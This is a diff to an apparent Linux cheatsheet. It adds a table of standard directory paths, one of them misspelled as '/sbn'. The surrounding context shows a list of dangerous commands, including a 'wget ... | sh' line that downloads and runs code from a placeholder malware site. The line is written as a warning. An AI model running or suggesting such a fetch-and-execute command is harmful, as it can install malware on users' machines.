@@ -20,6 +20,26 @@ some_cmd > some_cfg_file.conf # Overwrite Config that can broke smth.
 wget http://some_MALWARE_site -O- | sh # Download and run Malawre))
 
 ```
+#### LINUX PATH CHEATSHEET:
+
+|  Path  |   Description
+|--------|----------------------
+| /bin   | USER BINARIES
+| /sbn   | SYSTEM BINARIES
+| /etc   | CONFIGURATION FILES
+| /dev   | DEVICE FILES
+| /proc  | PROCESS INFORMATION
+| /var   | VARIABLE FILES
+| /tmp   | TEMPORARY FILES
+| /usr   | USER SYS RESOURCES
+| /home  | HOME DIRECTORIES
+| /boot  | BOOT LOADER FILES
+| /lib   | SYSTEM LIBRARIES
+| /opt   | OPTIONAL ADD ON APPS
+| /mnt   | MOUNT DIRECTORY
+| /media | REMOVABLE DEVICES
+| /srv   | SERVICE DATA
+
 #### SYSTEM MONITORING:
 ```sh
 journalctl -S "yyyy-MM-dd HH:mm:ss" --user
